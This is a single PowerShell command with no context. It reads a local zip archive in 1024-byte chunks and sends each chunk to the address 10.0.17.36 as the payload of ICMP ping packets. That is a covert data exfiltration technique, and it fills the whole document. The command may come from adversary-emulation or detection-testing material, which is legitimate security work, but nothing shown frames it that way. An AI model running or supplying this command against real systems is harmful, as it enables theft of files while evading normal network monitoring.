$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path "C:/temp/output_7za.zip" -Encoding Byte -ReadCount 1024) { $ping.Send("10.0.17.36", 1500, $Data) }
